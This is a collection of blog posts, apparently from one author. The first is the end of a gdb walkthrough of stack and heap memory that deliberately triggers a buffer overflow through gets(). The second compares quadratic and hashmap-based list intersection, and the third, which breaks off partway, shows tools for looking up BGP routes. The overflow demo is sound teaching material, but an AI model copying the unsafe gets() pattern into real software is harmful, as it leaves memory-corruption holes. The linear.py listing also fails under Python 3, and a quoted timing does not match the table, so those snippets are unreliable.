the beginning of  main \n\n First, let’s look at the stack at the start of the  main  function. Here’s\nthe value of our stack pointer right now: \n\n \n(gdb) p $sp\n$7 = (void *) 0x7fffffffe270\n \n\n So the stack for our current function starts at  0x7fffffffe270 . Cool. \n\n Now let’s use gdb to print out the first 40 words (aka 160 bytes) of memory\nafter the start of the current function’s stack. It’s possible that some of\nthis memory isn’t part of the stack because I’m not totally sure how big the\nstack is here. But at least the beginning of this is part of the stack. \n\n \n(gdb) x/40x $sp\n0x7fffffffe270: 0x00000000  0x00000000  0x55555250   0x00005555 \n0x7fffffffe280:  0x00000000  0x00000000   0x55555070  0x000055 55 \n0x7fffffffe290:  0xffffe390  0x00007fff   0x00000000  0x00000000\n0x7fffffffe2a0: 0x00000000  0x00000000  0xf7df4b25  0x00007fff\n0x7fffffffe2b0: 0xffffe398  0x00007fff  0xf7fca000  0x00000001\n0x7fffffffe2c0: 0x55555169  0x00005555  0xffffe6f9  0x00007fff\n0x7fffffffe2d0: 0x55555250  0x00005555  0x3cae816d  0x8acc2837\n0x7fffffffe2e0: 0x55555070  0x00005555  0x00000000  0x00000000\n0x7fffffffe2f0: 0x00000000  0x00000000  0x00000000  0x00000000\n0x7fffffffe300: 0xf9ce816d  0x7533d7c8  0xa91a816d  0x7533c789\n \n\n I’ve bolded approximately where the  stack_string ,  heap_string , and  x \nvariables are and colour coded them: \n\n \n x  is red and starts at  0x7fffffffe27c \n heap_string  is blue and starts at  0x7fffffffe280 \n stack_string  is purple and starts at  0x7fffffffe28e \n \n\n I think I might have bolded the location of some of those variables a bit wrong\nhere but that’s approximately where they are. \n\n One weird thing you might notice here is that  x  is the number  0x5555 , but\nwe set  x  to 10! That because  x  doesn’t actually get set until after our\n main  function starts, and we’re at the very beginning of  main . \n\n step 3: look at the stack again on line 10 \n\n Let’s skip a few lines and wait for our variables to actually get set to the\nvalues we initialized them to. By the time we get to line 10,  x  should be set to 10. \n\n First, we need to set another breakpoint: \n\n (gdb) b test.c:10\nBreakpoint 2 at 0x5555555551a9: file test.c, line 11.\n \n\n and continue the program running: \n\n (gdb) continue\nContinuing.\n\nBreakpoint 2, main () at test.c:11\n11\t    printf(\"Enter a string for the stack: \");\n \n\n Okay! Let’s look at all the same things again!  gdb  is formatting the bytes in\na slightly different way here and I don’t actually know why. Here’s a reminder of where to find our variables on the stack: \n\n \n x  is red and starts at  0x7fffffffe27c \n heap_string  is blue and starts at  0x7fffffffe280 \n stack_string  is purple and starts at  0x7fffffffe28e \n \n\n \n(gdb) x/80x $sp\n0x7fffffffe270:  0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00\n0x7fffffffe278:  0x50  0x52  0x55  0x55   0x0a  0x00  0x00  0x00 \n0x7fffffffe280:   0xa0  0x92  0x55  0x55  0x55  0x55  0x00  0x00 \n0x7fffffffe288:  0x70  0x50  0x55  0x55  0x55  0x55   0x73  0x74 \n0x7fffffffe290:   0x61  0x63  0x6b  0x00  0x00  0x00  0x00  0x00 \n0x7fffffffe298:  0x00  0x80  0xf7  0x8a  0x8a  0xbb  0x58  0xb6\n0x7fffffffe2a0:  0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00\n0x7fffffffe2a8:  0x25  0x4b  0xdf  0xf7  0xff  0x7f  0x00  0x00\n0x7fffffffe2b0:  0x98  0xe3  0xff  0xff  0xff  0x7f  0x00  0x00\n0x7fffffffe2b8:  0x00  0xa0  0xfc  0xf7  0x01  0x00  0x00  0x00\n \n\n There are a couple of interesting things to discuss here before we go further in the program. \n\n how  stack_string  is represented in memory \n\n Right now (on line 10)  stack_string  is set to “stack”. Let’s take a look at\nhow that’s represented in memory. \n\n We can print out the bytes in the string like this: \n\n (gdb) x/10x stack_string\n0x7fffffffe28e:\t0x73\t0x74\t0x61\t0x63\t0x6b\t0x00\t0x00\t0x00\n0x7fffffffe296:\t0x00\t0x00\n \n\n The string “stack” is 5 characters which corresponds to 5 ASCII bytes –\n 0x73 ,  0x74 ,  0x61 ,  0x63 , and  0x6b .  0x73  is  s  in ASCII,  0x74  is\n t , etc. \n\n We can also get gdb to show us the string  with  x/1s : \n\n (gdb) x/1s stack_string\n0x7fffffffe28e:\t\"stack\"\n \n\n how  heap_string  and  stack_string  are different \n\n You’ll notice that  stack_string  and  heap_string  are represented in very\ndifferent ways on the stack: \n\n \n stack_string  has the contents of the string (“stack”) \n heap_string  is a pointer to an address somewhere else in memory \n \n\n Here are the bytes on the stack for the  heap_string  variable: \n\n 0xa0  0x92  0x55  0x55  0x55  0x55  0x00  0x00\n \n\n These bytes actually get read backwards because x86 is little-endian, so the\nmemory address of  heap_string  is  0x5555555592a0 \n\n Another way to see the address of  heap_string  in gdb is just to print it out\nwith  p : \n\n (gdb) p heap_string\n$6 = 0x5555555592a0 \"\"\n \n\n the bytes that represent the integer  x \n\n x  is a 32-bit integer, and the bytes that represent it are  0x0a  0x00    0x00    0x00 . \n\n We need to read these bytes backwards again (the same way reason we read the\nbytes for  heap_string  address backwards), so this corresponds to the number\n 0x000000000a , or  0xa , which is 10. \n\n That makes sense! We set  int x = 10; ! \n\n step 4: read input from standard input \n\n Okay, we’ve initialized the variables, now let’s see how the stack changes when\nthis part of the C program runs: \n\n printf(\"Enter a string for the stack: \");\ngets(stack_string);\nprintf(\"Enter a string for the heap: \");\ngets(heap_string);\n \n\n We need to set another breakpoint: \n\n (gdb) b test.c:16\nBreakpoint 3 at 0x555555555205: file test.c, line 16.\n \n\n and continue running the program \n\n (gdb) continue\nContinuing.\n \n\n We’re prompted for 2 strings, and I entered  123456789012  for the stack string\nand  bananas  for the heap. \n\n let’s look at  stack_string  first (there’s a buffer overflow!) \n\n (gdb) x/1s stack_string\n0x7fffffffe28e:\t\"123456789012\"\n \n\n That seems pretty normal, right? We entered  123456789012  and now it’s set to  123456789012 . \n\n But there’s something weird about this. Here’s what those bytes look like on\nthe stack. They’re highlighted in purple again. \n\n \n0x7fffffffe270:  0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00\n0x7fffffffe278:  0x50  0x52  0x55  0x55  0x0a  0x00  0x00  0x00\n0x7fffffffe280:  0xa0  0x92  0x55  0x55  0x55  0x55  0x00  0x00\n0x7fffffffe288:  0x70  0x50  0x55  0x55  0x55  0x55   0x31  0x32 \n0x7fffffffe290:   0x33  0x34  0x35  0x36  0x37  0x38  0x39  0x30 \n0x7fffffffe298:   0x31  0x32  0x00   0x8a  0x8a  0xbb  0x58  0xb6\n0x7fffffffe2a0:  0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00\n0x7fffffffe2a8:  0x25  0x4b  0xdf  0xf7  0xff  0x7f  0x00  0x00\n0x7fffffffe2b0:  0x98  0xe3  0xff  0xff  0xff  0x7f  0x00  0x00\n0x7fffffffe2b8:  0x00  0xa0  0xfc  0xf7  0x01  0x00  0x00  0x00\n \n\n The weird thing about this is that  stack_string was only supposed to be 10\nbytes . But now suddenly we’ve put 13 bytes in it? What’s happening? \n\n This is a classic buffer overflow, and what’s happening is that  stack_string \nwrote over other data from the program. This hasn’t caused a problem yet in our\ncase, but it can crash your program or, worse, open you up to Very Bad Security\nProblems. \n\n For example, if  stack_string  were before  heap_string  in memory, then we\ncould overwrite the address that  heap_string  points to. I’m not sure exactly\nwhat’s in memory after  stack_string  here but we could probably use this to do\nsome kind of shenanigans. \n\n something actually detects the buffer overflow \n\n When I cause this buffer overflow problem, here’s \n\n \n ./test\nEnter a string for the stack: 01234567891324143\nEnter a string for the heap: adsf\nStack string is: 01234567891324143\nHeap string is: adsf\nx is: 10\n*** stack smashing detected ***: terminated\nfish: Job 1, './test' terminated by signal SIGABRT (Abort)\n \n\n My guess about what’s happening here is that the  stack_string  variable is\nactually at the end of this function’s stack, and so the extra bytes are going into a\ndifferent region of memory. \n\n When you do this intentionally as a security exploit it’s called “stack\nsmashing”, and somehow something is detecting that this is happening.\nOriginally I wasn’t sure how this was being detected, but a couple of people\nemailed me to say that it’s a compiler feature called “stack protection”.\nBasically it adds a “canary” value to the end of the stack and when the\nfunction returns it checks to see if that value has been changed. Here’s an\n article about the stack smashing protector on the OSDev wiki . \n\n That’s all I have to say about buffer overflows. \n\n now let’s look at  heap_string \n\n We also read a value ( bananas ) into the  heap_string  variable. Let’s see what that\nlooks like in memory. \n\n Here’s what  heap_string  looks on the stack after we read the variable in. \n\n \n(gdb) x/40x $sp\n0x7fffffffe270:  0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00\n0x7fffffffe278:  0x50  0x52  0x55  0x55  0x0a  0x00  0x00  0x00\n0x7fffffffe280:   0xa0  0x92  0x55  0x55  0x55  0x55  0x00  0x00 \n0x7fffffffe288:  0x70  0x50  0x55  0x55  0x55  0x55  0x31  0x32\n0x7fffffffe290:  0x33  0x34  0x35  0x36  0x37  0x38  0x39  0x30\n \n\n The thing to notice here is that it looks exactly the same! It’s an address,\nand the address hasn’t changed. But let’s look at what’s at that address. \n\n (gdb) x/10x 0x5555555592a0\n0x5555555592a0:\t0x62\t0x61\t0x6e\t0x61\t0x6e\t0x61\t0x73\t0x00\n0x5555555592a8:\t0x00\t0x00\n \n\n Those are the bytes for  bananas ! Those bytes aren’t in the stack at all,\nthey’re somewhere else in memory (on the heap) \n\n where are the stack and the heap? \n\n We’ve talked about how the stack and the heap are different regions of memory,\nbut how can you tell where they are in memory? \n\n There’s a file for each process called  /proc/$PID/maps  that shows you the\nmemory maps for each process. Here’s where you can see the stack and the heap\nin there. \n\n $ cat /proc/24963/maps\n... lots of stuff omitted ... \n555555559000-55555557a000 rw-p 00000000 00:00 0                          [heap]\n... lots of stuff omitted ... \n7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]\n \n\n One thing to notice is that here the heap addresses start with  0x5555  and\nthe stack addresses start with  0x7fffff . So it’s pretty easy to tell the\ndifference between an address on the stack and an address on the heap. \n\n playing about with gdb like this is really helpful \n\n This was kind of a whirlwind tour and I didn’t explain everything, but\nhopefully seeing what the data actually looks like in memory makes it a little\nmore clear what the stack actually is. \n\n I really recommend playing around with gdb like this – even if you don’t\nunderstand every single thing that you see in memory, I find that actually\nseeing the data in my program’s memory like this makes these abstract concepts\nlike “the stack” and “the heap” and “pointers” a lot easier to understand. \n\n maybe lldb is easier to use \n\n A couple of people suggested that lldb is easier to use than gdb. I haven’t\nused it yet but I looked at it quickly, and it does seem like it might be\nsimpler!  As far as I can tell from a quick inspection everything in this\nwalkthrough also works in lldb, except that you need to do  p/s  instead of\n p/1s . \n\n ideas for more exercises \n\n A few ideas (in no particular order) for followup exercises to think about the\nstack: \n\n \n try adding another function to  test.c  and make a breakpoint at the\nbeginning of that function and see if you can find the stack from  main !\nThey say that “the stack grows down” when you call a function, can you see\nthat happening in gdb? \n return a pointer from a function to a string on the stack and see what goes\nwrong. Why is it bad to return a pointer to a string on the stack? \n try causing a stack overflow in C and try to understand exactly what happens\nwhen the stack overflows by looking at it in gdb! \n look at the stack in a Rust program and try to find the variables! \n try some of the buffer overflow challenges in the  nightmare\ncourse . The README for each\nchallenge is the solution so avoid reading it if you don’t want to be spoiled.\nThe idea with all of those challenges is that you’re given a binary and you need to figure out how to\ncause a buffer overflow to get it to print out the “flag” string. \n \n\n"},
{"url": "https://jvns.ca/blog/2021/09/10/hashmaps-make-things-fast/", "title": "Quadratic algorithms are slow (and hashmaps are fast)", "content": "\n     \n\n Hello! I was talking to a friend yesterday who was studying for a programming\ninterview and trying to learn some algorithms basics. \n\n The topic of quadratic-time vs linear-time algorithms came up, I thought this\nwould be fun to write about here because avoiding quadratic-time algorithms\nisn’t just important in interviews – it’s sometimes good to know about in real\nlife too! I’ll explain what a “quadratic-time algorithm is” in a minute :) \n\n here are the 3 things we’ll talk about: \n\n \n quadratic time functions are WAY WAY WAY slower than linear time functions \n sometimes you can make a quadratic algorithm into a linear algorithm by using a hashmap \n this is because hashmaps lookups are very fast (instant!) \n \n\n I’m going to try to keep the math jargon to a minimum and focus on real code\nexamples and how fast/slow they are. \n\n our problem: intersect two lists \n\n Let’s talk about a simple interview-style problem: getting the intersection of\n2 lists of numbers. For example,  intersect([1,2,3], [2,4,5])  should return\n [2] . \n\n This problem is also somewhat realistic – you could imagine having a real\nprogram where you need to take the intersection of 2 lists of IDs. \n\n the “obvious” solution: \n\n Let’s write some code to take the intersection of 2 lists. Here’s a program that does it, called  quadratic.py . \n\n import sys\n\n# the actual code\ndef intersection(list1, list2):\n    result = []\n    for x in list1:\n        for y in list2:\n            if x == y:\n                result.append(y)\n    return result\n\n# some boilerplate so that we can run it from the command line on lists of\n# different sizes\ndef run(n):\n    # make 2 lists of n+1 elements\n    list1 = list(range(3, n)) + [2]\n    list2 = list(range(n+1, 2*n)) + [2]\n    # intersect them and print out the result\n    print(list(intersection(list1, list2)))\n\n# Run with the program's first command line argument\nrun(int(sys.argv[1]))\n \n\n The reason it’s called  quadratic.py  is that if  list1  and  list2  have size\n n , then the inner loop ( if x == y ) will run  n^2  times. And in math,\nfunctions like  x^2  are called “quadratic” functions. \n\n how slow is  quadratic.py ? \n\n Let’s run this program with a bunch of lists of different lengths. The\nintersection of the two lists is always the same:  [2] . \n\n $ time python3 quadratic.py 10\n[2]\n\nreal\t0m0.037s\n$ time python3 quadratic.py 100\n[2]\n\nreal\t0m0.053s\n$ time python3 quadratic.py 1000\n[2]\n\nreal\t0m0.051s\n$ time python3 quadratic.py 10000 # 10,000\n[2]\n\nreal\t0m1.661s\n \n\n So far none of this is too bad – it’s still taking less than 2 seconds. \n\n Then I ran it on two lists with 100,000 elements, and I had to wait a LONG time. Here’s the result: \n\n $ time python3 quadratic.py 100000 # 100,000\n[2]\n\nreal\t2m41.059s\n \n\n This is very slow! It’s 160 seconds, which is almost exactly 100x longer than\nit did to run on 10,000 elements (which was 1.6 seconds). So we can see that\nafter a certain point, every time we make the list 10x bigger, the program\ntakes about 100x longer to run. \n\n I didn’t try to run this program on 1,000,000 elements, because I knew it would take 100x\nlonger again – probably about 3 hours. I don’t have time for that! \n\n You can probably see now why quadratic time algorithms can be a problem – even\nthis very simple program starts getting very slow pretty quickly. \n\n let’s write a fast version:  linear.py \n\n Okay, so let’s write a fast version of the program. First I’ll show you the program, then I’ll explain it. \n\n import sys\n\n# the actual algorithm\ndef intersection(list1, list2):\n    set1 = set(list1) # this is a hash set\n    result = []\n    for y in list2:\n        if y in set1:\n            result.append(y)\n    return result\n\n# some boilerplate so that we can run it from the command line on lists of\n# different sizes\ndef run(n):\n    # make 2 lists of n+1 elements\n    list1 = range(3, n) + [2]\n    list2 = range(n+1, 2*n) + [2]\n    # print out the intersection\n    print(intersection(list1, list2))\n\nrun(int(sys.argv[1]))\n \n\n (this isn’t the most idiomatic Python, but I wanted to write it without using\ntoo many python-isms so that people who don’t know Python could understand it\nmore easily) \n\n We’ve done 2 things differently here than our slow program: \n\n \n convert  list1  into a set called  set1 \n only use one for loop instead of two for loops \n \n\n let’s see how fast this  linear.py  program is \n\n Before we talk about  why  this program is fast, let’s first prove that it’s\nfast by running it on some big lists. Here it is running on lists of size 10 to\n10,000,000. (remember that our original program started getting SUPER slow when\nrun on 100,000 elements) \n\n \n$ time python3 linear.py 100\n[2]\n\nreal\t0m0.056s\n$ time python3 linear.py 1000\n[2]\n\nreal\t0m0.036s\n$ time python3 linear.py 10000 # 10,000\n[2]\n\nreal\t0m0.028s\n$ time python3 linear.py 100000 # 100,000 \n[2]\n\nreal\t0m0.048s <-- quadratic.py took 2 minutes in this case! we're doing it in 0.04 seconds now!!! so fast!\n$ time python3 linear.py 1000000 # 1,000,000\n[2]\n\nreal\t0m0.178s\n$ time python3 linear.py 10000000 # 10,000,000\n[2]\n\nreal\t0m1.560s\n \n\n running  linear.py  on an extremely big list \n\n If we try to run it on a very very big list (10 billion / 10,000,000,000\nelements), then actually we run into a different problem: it’s  fast  enough\n(that list is only 100x bigger than the list that took 4.2 seconds, so we could\nprobably do it in 420 seconds), but my computer doesn’t have enough memory to\nstore all of the elements of the list and so the program crashes before it gets\nthere. \n\n $ time python3 linear.py 10000000000\nTraceback (most recent call last):\n  File \"/home/bork/work/homepage/linear.py\", line 18, in <module>\n    run(int(sys.argv[1]))\n  File \"/home/bork/work/homepage/linear.py\", line 13, in run\n    list1 = [1] * n + [2]\nMemoryError\n\nreal\t0m0.090s\nuser\t0m0.034s\nsys\t0m0.018s\n \n\n We’re not talking about memory usage in this blog post though, so let’s ignore that. \n\n okay, why is  linear.py  fast? \n\n Now I’ll try to explain why  linear.py  is fast. \n\n Here’s the code again: \n\n def intersection(list1, list2):\n    set1 = set(list1) # this is a hash set\n    result = []\n    for y in list2:\n        if y in set1:\n            result.append(y)\n    return result\n \n\n Let’s say that  list1  and  list2  are both lists of about 10,000,000\ndifferent elements. That’s kind of a lot of elements! \n\n So why is this able to run so fast? HASHMAPS!!! \n\n hashmap lookups are instant (“constant time”) \n\n Let’s look at this if statement from our fast program: \n\n if y in set1:\n    result.append(y)\n \n\n You might think that this check –  if y in set1  – would be slower if the  set1 \ncontains 10 million elements than it is if  set1  contains 1000 elements. But\nit’s not! It always takes basically the same amount of time (SUPER FAST), no\nmatter how big  set1  gets. \n\n This is because  set1  is a hash set, which is a type of hashmap/hashtable which only has keys and no values. \n\n I’m not going to explain  why  hashmap lookups are instant in this post, but the amazing\nVaidehi Joshi’s  basecs  series has explanations of  hash tables \nand  hash functions  which talk about it. \n\n accidentally quadratic: real life quadratic algorithms! \n\n This issue that we saw where quadratic time algorithms are really slow is\nactually a problem that shows up in real life – Nelson Elhage has a great blog\ncalled  accidentally quadratic  with\nstories about performance problems caused by code that accidentally ran in\nquadratic time. \n\n quadratic time algorithms can kind of sneak up on you \n\n The weird thing about quadratic time algorithms is that when you run them on a\nsmall number of elements (like 1000), it doesn’t seem so bad! It’s not that\nslow! But then if you throw 1,000,000 elements at it, it can really take hours\nto run. \n\n So I think it’s worth being broadly aware of them, so you can avoid writing\nthem by accident. Especially if there’s an easy way to write a linear-time\nalgorithm instead (like using a hashmap). \n\n sometimes the “slow” algorithm is actually faster \n\n If you’re doing serious performance work, for example on an embedded system,\nit’s also important to realize that a “faster” algorithm like this example of\nusing a hashmap will often actually be slower on a small number of elements.\n(I’ve never run into this myself, but friends have told me that it comes up) \n\n For example, this great blog post  Linear vs Binary Search  has\nsome benchmarks showing that linear search is faster than binary search for\nsmall arrays (up to 100 elements!) \n\n hashmaps always feel a little magical to me \n\n Hashmaps aren’t magic of course (you can learn the math behind why hashmap\nlookups are instant! it’s cool!), but it always  feels  a little magical to me,\nand every time I use hashmaps in a program to speed things up it makes me happy\n:) \n\n"},
{"url": "https://jvns.ca/blog/2021/10/05/tools-to-look-at-bgp-routes/", "title": "Tools to explore BGP", "content": "\n     \n\n Yesterday there was a big Facebook outage caused by BGP. I’ve been vaguely\ninterested in learning more about BGP for a long time, so I was reading a\ncouple of articles. \n\n I got frustrated because none of the articles showed me how I could actually\nlook up information related to BGP on my computer, so I  wrote a tweet asking for tools . \n\n I got a bunch of useful replies as always, so this blog post shows some tools\nyou can use to look up BGP information. There might be an above average number\nof things wrong in this post because I don’t understand BGP that well. \n\n I can’t publish BGP routes \n\n One of the reasons I’ve never learned much about BGP is – as far as I know, I don’t have access to publish BGP routes on the internet. \n\n With most networking protocols, you can pretty trivially get access to\nimplement the protocol yourself if you want. For example you can: \n\n \n issue your own TLS certificates \n write your own HTTP server \n write your own TCP implementation \n write your own authoritative DNS server for your domain (I’m trying to do that right now for a small project) \n set up your own certificate authority \n \n\n But with BGP, I think that unless you own your own ASN, you can’t publish routes yourself!\n(you  could  implement BGP on your home network, but that feels a bit boring to\nme, when I experiment with things I like them to actually be on the real internet). \n\n Anyway, even though I can’t experiment with it, I still think it’s super\ninteresting because I love networking, so I’m going to show you some tools I\nfound to learn about BGP :) \n\n First let’s talk through some BGP terminology though. I’m going to go pretty\nfast because I’m more interested in the tools and there are a lot of high level\nexplanations of BGP out there (like this  cloudflare post ). \n\n What’s an AS (“autonomous system”) \n\n The first thing we need to understand is an AS. Every AS: \n\n \n is owned by an organization (usually a large organization like your ISP, a government, a university, Facebook, etc) \n controls a specific set of IP addresses (for example my ISP’s AS includes 247,808 IP addresses) \n has a number (like 1403) \n \n\n Here are some observations I made about ASes just by doing some experimentation: \n\n \n Some fairly big tech companies don’t have their own AS. For example, I\nlooked up Patreon on BGPView, and as far as I can tell they don’t own as AS\n– their main site (patreon.com,\n 104.16.6.49 ) is in Cloudflare’s AS. \n An AS can include IPs in many countries. Facebook’s AS ( AS32934 ) definitely has IP addresses in Singapore, Canada, Nigeria, Kenya, the US, and more countries. \n It seems like IP address can be in more than one AS. For example, if I look up  209.216.230.240 , it has 2 ASNs associated with it – AS6130 and AS21581. Apparently when this happens the more specific route takes priority – so packets to that IP would get routed to AS21581. \n \n\n what’s a BGP route? \n\n There are a lot of routers on the internet. For example, my ISP has routers. \n\n When I send my ISP a packet (for example by running  ping 129.134.30.0 ), my ISP’s routers\nneeds to figure out how to actually get my packet to the IP address\n 129.134.30.0 . \n\n The way the router figures this out is that it has a  route table  – it has a list\nof a bunch of IP ranges (like  129.134.30.0/23 ), and routes it knows about to\nget to that subnet. \n\n Here’s an example of a real route for  129.134.30.0/23 : (one of Facebook’s subnets). This one isn’t from my ISP. \n\n   11670 32934\n    206.108.35.2 from 206.108.35.254 (206.108.35.254)\n      Origin IGP, metric 0, valid, external\n      Community: 3856:55000\n      Last update: Mon Oct  4 21:17:33 2021\n \n\n I think that this is saying that one path to  129.134.30.0  is through the\nmachine  206.108.35.2 , which is on its local network. So the router might send\nmy ping packet to  206.108.35.2  next, and then  206.108.35.2  will know how to\nget it to Facebook. The two numbers at the beginning ( 11670 32934 ) are ASNs. \n\n what’s BGP? \n\n My understanding of BGP is very shaky, but it’s a protocol that companies use to\nadvertise BGP routes. \n\n What happened yesterday with Facebook is that they basically made BGP\nannouncements withdrawing all their BGP routes, so every router in the world\ndeleted all of its routes related to Facebook, so no traffic could get there. \n\n Okay, now that we’ve covered some basic terminology, let’s talk about tools you\ncan use to look at autonomous systems and BGP! \n\n tool 1: look at your ISP’s AS with BGPView \n\n To make this AS thing less abstract, let’s use a tool called  BGPView  to look at a real AS. \n\n My ISP (EBOX) owns  AS 1403 . Here are the  IP addresses my ISP owns . If I look up my\ncomputer’s public IPv4 address, I can check that it’s one of the IP addresses\nmy ISP owns – it’s in the  104.163.128.0/17  block. \n\n BGPView also has this graph of how my ISP is connected to other ASes \n\n \n\n tool 2:  traceroute -A  and  mtr -z \n\n Okay, so we’re interested in autonomous systems. Let’s see which ASes I go through from \n\n traceroute  and  mtr  both have options to tell you the ASN for every IP you go through. The flags are  traceroute -A  and  mtr -z , respectively. \n\n Let’s see which autonomous systems I go through on my way to facebook.com with  mtr ! \n\n $ mtr -z facebook.com\n 1. AS???    LEDE.lan                                   \n 2. AS1403   104-163-190-1.qc.cable.ebox.net            \n 3. AS???    10.170.192.58                              \n 4. AS1403   0.et-5-2-0.er1.mtl7.yul.ebox.ca            \n 5. AS1403   0.ae17.er2.mtl3.yul.ebox.ca                \n 6. AS1403   0.ae0.er1.151fw.yyz.ebox.ca                \n 7. AS???    facebook-a.ip4.torontointernetxchange.net  \n 8. AS32934  po103.psw01.yyz1.tfbnw.net                 \n 9. AS32934  157.240.38.75                              \n10. AS32934  edge-star-mini-shv-01-yyz1.facebook.com    \n \n\n This is interesting – it looks like we go directly from my ISP’s AS (1403) to\nFacebook’s AS (32934), with an “internet exchange” in between. \n\n \nI’m not sure what an  internet\nexchange  is but I know\nthat it’s an extremely important part of the internet. That’s going to be for\nanother day though. My best guess is that it’s the part of the internet that\nenables “peering” – like an IX is a server room with a gigantic switch with\ninfinite bandwith in it where a bunch of different companies put their\ncomputers so they can send each other packets.\n \n\n mtr looks up ASNs with DNS \n\n I got curious about how mtr looks up ASNs, so I used strace. I saw that it looked like it was using DNS, so I ran  dnspeep , and voila! \n\n $ sudo dnspeep\n...\nTXT   1.190.163.104.origin.asn.cymru.com 192.168.1.1          TXT: 1403 | 104.163.176.0/20 | CA | arin | 2014-08-14, TXT: 1403 | 104.163.160.0/19 | CA | arin | 2014-08-14, TXT: 1403 | 104.163.128.0/17 | CA | arin | 2014-08-14\n...\n \n\n So it looks like we can find the ASN for  104.163.190.1  by looking up the  txt  record on  1.190.163.104.origin.asn.cymru.com , like this: \n\n $ dig txt 1.190.163.104.origin.asn.cymru.com\n1.190.163.104.origin.asn.cymru.com. 13911 IN TXT \"1403 | 104.163.160.0/19 | CA | arin | 2014-08-14\"\n1.190.163.104.origin.asn.cymru.com. 13911 IN TXT \"1403 | 104.163.128.0/17 | CA | arin | 2014-08-14\"\n1.190.163.104.origin.asn.cymru.com. 13911 IN TXT \"1403 | 104.163.176.0/20 | CA | arin | 2014-08-14\"\n \n\n That’s cool! Let’s keep moving though. \n\n tool 3: the packet clearing house looking glass \n\n PCH (“packet clearing house”) is the organization that runs a lot of internet\nexchange points. A “looking glass” seems to be a generic term for a web form\nthat lets you run network commands from another person’s computer. There are\nlooking glasses that don’t support BGP, but I’m just interested in ones that\nshow you information about BGP routes. \n\n Here’s the PCH looking glass:  https://www.pch.net/tools/looking_glass/ . \n\n In the web form on that site, I picked the Toronto IX (“TORIX”), since that’s what  mtr  said I was using to go to facebook.com. \n\n thing 1: “show ip bgp summary” \n\n Here’s the output. I’ve redacted some of it: \n\n IPv4 Unicast Summary:\nBGP router identifier 74.80.118.4, local AS number 3856 vrf-id 0\nBGP table version 33061919\nRIB entries 513241, using 90 MiB of memory\nPeers 147, using 3003 KiB of memory\nPeer groups 8, using 512 bytes of memory\n\nNeighbor        V         AS MsgRcvd MsgSent   TblVer  InQ OutQ  Up/Down State/PfxRcd\n...\n206.108.34.248  4       1403  484672  466938        0    0    0 05w3d03h           50\n...\n206.108.35.2    4      32934  482088  466714        0    0    0 01w6d07h           38\n206.108.35.3    4      32934  482019  466475        0    0    0 01w0d06h           38\n...\n\nTotal number of neighbors 147\n \n\n My understanding of what this is saying is that the Toronto Internet Exchange\n(“TORIX”) is directly connected to both my ISP (EBOX, AS 1403) and Facebook (AS\n32934). \n\n thing 2: “show ip bgp 129.134.30.0” \n\n Here’s the output of picking “show ip bgp” for  129.134.30.0  (one of Facebook’s IP addresses): \n\n BGP routing table entry for 129.134.30.0/23\nPaths: (4 available, best #4, table default)\n  Advertised to non peer-group peers:\n  206.220.231.55\n  11670 32934\n    206.108.35.2 from 206.108.35.254 (206.108.35.254)\n      Origin IGP, metric 0, valid, external\n      Community: 3856:55000\n      Last update: Mon Oct  4 21:17:33 2021\n\n  11670 32934\n    206.108.35.2 from 206.108.35.253 (206.108.35.253)\n      Origin IGP, metric 0, valid, external\n      Community: 3856:55000\n      Last update: Mon Oct  4 21:17:31 2021\n\n  32934\n    206.108.35.3 from 206.108.35.3 (157.240.58.225)\n      Origin IGP, metric 0, valid, external, multipath\n      Community: 3856:55000\n      Last update: Mon Oct  4 21:17:27 2021\n\n  32934\n    206.108.35.2 from 206.108.35.2 (157.240.58.182)\n      Origin IGP, metric 0, valid, external, multipath, best (Older Path)\n      Community: 3856:55000\n      Last update: Mon Oct  4 21:17:27 2021\n \n\n This seems to be saying that there are 4 routes to Facebook from that internet exchange. \n\n the quebec internet exchange doesn’t seem to know anything about Facebook \n\n I also tried the same thing from the Quebec internet exchange QIX (which is\npresumably closer to me, since I live in Montreal and not Toronto). But the QIX\ndoesn’t seem to know anything about Facebook – when I put in  129.134.30.0  it\njust says “% Network not in table”. \n\n So I guess that’s why I was sent through the Toronto IX and not the Quebec one. \n\n more BGP looking glasses \n\n Here are some more websites with looking glasses that will give you similar\ninformation from other points of view. They all seem to support the same  show ip bgp  syntax, maybe because they’re running the same software? I’m not sure. \n\n \n http://www.routeviews.org/routeviews/index.php/collectors/ \n http://www.routeservers.org/ \n https://lg.he.net/ \n \n\n There seem to be a LOT of these looking glass services out there, way more than just those 3 lists. \n\n Here’s an example session with one of the servers on this list:\nroute-views.routeviews.org. This time I connected via telnet and not through a\nweb form, but the output looks like it’s in the same format. \n\n $ telnet route-views.routeviews.org\n\nroute-views>show ip bgp 31.13.80.36\n\nBGP routing table entry for 31.13.80.0/24, version 1053404087\nPaths: (23 available, best #2, table default)\n  Not advertised to any peer\n  Refresh Epoch 1\n  3267 1299 32934\n    194.85.40.15 from 194.85.40.15 (185.141.126.1)\n      Origin IGP, metric 0, localpref 100, valid, external\n      path 7FE0C3340190 RPKI State valid\n      rx pathid: 0, tx pathid: 0\n  Refresh Epoch 1\n  6939 32934\n    64.71.137.241 from 64.71.137.241 (216.218.252.164)\n      Origin IGP, localpref 100, valid, external, best\n      path 7FE135DB6500 RPKI State valid\n      rx pathid: 0, tx pathid: 0x0\n  Refresh Epoch 1\n  701 174 32934\n    137.39.3.55 from 137.39.3.55 (137.39.3.55)\n      Origin IGP, localpref 100, valid, external\n      path 7FE1604D3AF0 RPKI State valid\n      rx pathid: 0, tx pathid: 0\n  Refresh Epoch 1\n  20912 3257 1299 32934\n    212.66.96.126 from 212.66.96.126 (212.66.96.126)\n      Origin IGP, localpref 100, valid, external\n      Community: 3257:8095 3257:30622 3257:50001 3257:53900 3257:53904 20912:65004\n      path 7FE1195AF140 RPKI State valid\n      rx pathid: 0, tx pathid: 0\n  Refresh Epoch 1\n  7660 2516 1299 32934\n    203.181.248.168 from 203.181.248.168 (203.181.248.168)\n      Origin IGP, localpref 100, valid, external\n      Community: 2516:1030 7660:9001\n      path 7FE0D195E7D0 RPKI State valid\n      rx pathid: 0, tx pathid: 0\n          \n \n\n Here there are a few options for routes: \n\n \n 3267 1299 32934 \n 6939 32934 \n 701 174 32934 \n 20912 3257 1299 32934 \n 7660 2516 1299 32934 \n \n\n I think the reason there’s more than one AS in all of these is that 